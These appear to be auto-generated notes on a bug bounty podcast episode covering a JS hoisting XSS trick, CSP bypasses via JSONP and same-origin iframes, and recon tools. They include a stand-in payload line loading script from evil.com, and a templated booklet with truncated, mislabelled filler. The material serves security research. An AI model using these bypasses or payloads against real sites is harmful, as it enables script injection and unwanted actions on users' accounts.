---
title: "CSP Research, Iframe Hopping, and Client-side Shenanigans"
episode: 47
---


# Episode 47 CSP Research, Iframe Hopping, and Client-side Shenanigans

### TL;DR
- CSS/visual: discussed struggles of getting back into hacking after breaks
- JS Hoisting technique for XSS: define a function with `function` keyword to hoist it, bypass "undefined" errors
- Iframe Sandwich: use cross-tab frame communication to turn XSS on a subdomain into impact on the primary domain
- CSP bypass via same-origin iframe: iframe a page without CSP header, inject script, communicate back to parent
- CSP bypass via JSONP with restricted callback (dots and letters only) — use `window.opener` to click buttons cross-tab

### Key takeaways
- Notes are critical for restarting after a break; take notes on program taxonomy, OAuth client IDs, scopes
- Stick to one program and take detailed notes — top program specialists out-earn generalists
- JS Hoisting: functions defined with `function` keyword are hoisted to top of scope; use to define an object before a call that references `x.y` where `x` was undefined

### Bugs and Findings
#### JS Hoisting XSS
- **Target/context:** Script injection context: `x.y(1,<INJECTION>)` where `x` and `y` are undefined
- **Technique:**
  1. Inject `function x(){}` — hoisted to top; now `x` exists as a function
  2. `x.y` now fails only on `.y` being undefined, but the arguments evaluate before the `.y` call fails
  3. In the arguments, execute arbitrary code
- **Key technical details:** `function x(){}` is hoisted (definition + initialization). `var x = function(){}` is NOT hoisted (declaration only, initialized later). Difference between function declaration and function expression.

#### CSP Bypass via JSONP (octagon.net research)
- **Target/context:** WordPress site with CSP that allows JSONP endpoint with restricted callback (only dots and letters — no parentheses or arbitrary code)
- **Technique:**
  1. Open target page from attacker page via `window.open()`
  2. Attacker page redirects itself to victim domain (same origin now)
  3. Trigger JSONP on the victim page — callback is `window.opener.body.firstChild.click`
  4. `window.opener` now points to same-origin page → `click()` on a button is executed
- **Impact:** CSRF-style action without user interaction, within CSP

#### CSP Bypass via Same-Origin Iframe (Wallarm research)
- **Target/context:** CSP with `unsafe-inline` and `data:` but no external domains
- **Technique:**
  1. XSS injects an iframe pointing to a same-origin page that lacks CSP header (e.g. a static asset)
  2. Since no CSP in iframe, attacker can inject `<script src="https://evil.com/payload.js">` into it
  3. Script loads from attacker domain, executes in same-origin context, can access parent DOM
- **Key insight:** CSP headers are not universally applied; static assets (CSS, JS, PNG files, S3 buckets) often don't have CSP

### Techniques and Primitives
- **Iframe Sandwich** — attacker page (controlling iframe A) opens victim page (which iframes same-origin iframe B). Use same-origin to reach from iframe A to iframe B and modify content
- **Wildcard DNS profiling** — generate "wildcard profile" by resolving multiple iterations; anything that doesn't match the profile is a diamond in the rough

### Tooling and Resources
- **XNL Reveal** — Chrome extension showing reflected params + hidden/disabled elements
- **JSWeasel** — JS analysis tool (Charlie in Discord)
- **ThankUNext** — Next.js route enumeration from build manifest
- **SSRF Utility Tool** (Bebiks) — self-hosted collaborator replacement
- **Google Burp Suite plugin** — protobuf testing (by Sam Erb and team)
- **jsmon** — JS change monitor

### Suggestions and Advices from Hunter
- "Recon is the appetizer, not the main course. The point of recon is to find more apps to hack"
- "Notes on OAuth stuff — client IDs, scopes, client secrets — is what separates top performers on one program"
- "When you can't hack, just start the application. Start small. The bugs will come."

### AI Takeaway
The JS Hoisting XSS trick is a beautiful example of exploiting a language feature: `function` declarations are hoisted with their body, turning an "undefined" error into a working exploit. The JSONP CSP bypass using `window.opener` redirect is a novel exploitation pattern (CSP-bounded XSS without script execution).
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
CSS/visual: discussed struggles of getting back into hacking after breaks

#### 2. What you should learn
- Understand **notes are critical for restarting after a break; take notes on program taxonomy, oauth client ids, scopes**
- Understand **stick to one program and take detailed notes — top program specialists out-earn generalists**
- Understand **js hoisting: functions defined with `function` keyword are hoisted to top of scope; use to define an object before a call that references `x.y` where `x` was undefined**

#### 3. Core concepts explained
**JS Hoisting XSS**
- **What it is:** Cross-Site Scripting — injecting malicious JavaScript that runs in a victim's browser session, allowing session theft, phishing, or further attacks.
- **Why it matters:** XSS remains one of the most common and impactful web vulnerabilities. Stored XSS can affect every user who views the page.
- **Common mistake:** Focusing only on reflected XSS and missing stored XSS in profile fields, file uploads, or message boards.

**CSP Bypass via JSONP (octagon.net research)**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**CSP Bypass via Same-Origin Iframe (Wallarm research)**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**Iframe Sandwich**
- attacker page (controlling iframe A) opens victim page (which iframes same-origin iframe B). Use same-origin to reach from iframe A to iframe B and modify content

**Wildcard DNS profiling**
- generate "wildcard profile" by resolving multiple iterations; anything that doesn't match the profile is a diamond in the rough


#### 4. Techniques and tactics
**Iframe Sandwich**
- **What it is:** attacker page (controlling iframe A) opens victim page (which iframes same-origin iframe B). Use same-origin to reach from iframe A to iframe B and modify content
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Wildcard DNS profiling**
- **What it is:** generate "wildcard profile" by resolving multiple iterations; anything that doesn't match the profile is a diamond in the rough
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"Recon is the appetizer, not the main course. The point of recon is to find more apps to hack"*
- *"Notes on OAuth stuff"* — **client IDs, scopes, client secrets — is what separates top performers on one program**
- *"When you can't hack, just start the application. Start small. The bugs will come."*

#### 6. Mental models
- **Recon is the appetizer, not the main course. The point of re** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Notes on OAuth stuff — client IDs, scopes, client secrets — ** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **When you can't hack, just start the application. Start small** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** Notes are critical for restarting after a break; take notes on program taxonomy, OAuth client IDs, scopes
- **Try this:** Stick to one program and take detailed notes — top program specialists out-earn generalists
- **Try this:** JS Hoisting: functions defined with `function` keyword are hoisted to top of scope; use to define an object before a call that references `x.y` where `x` was undefined

#### 8. Red flags and pitfalls
- **Giving up too early** — Many bugs require creative pivoting when initial exploitation paths are blocked
- **Ignoring blind vulnerabilities** — Blind SSRF, blind XSS, and timing-based attacks can be just as impactful as visible ones
- **Missing the forest for the trees** — Don't get tunnel vision on one vulnerability class; step back and consider the full attack surface

#### 9. Vocabulary
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users
- **OAuth** — Open standard for authorization — delegated access without sharing passwords
- **DNS** — Domain Name System — translates domain names to IP addresses

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in JS Hoisting XSS?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **CSS/visual: discussed struggles of getting back into hacking after breaks**
2. **Notes are critical for restarting after a break; take notes on program taxonomy,**
3. **Stick to one program and take detailed notes — top program specialists out-earn **
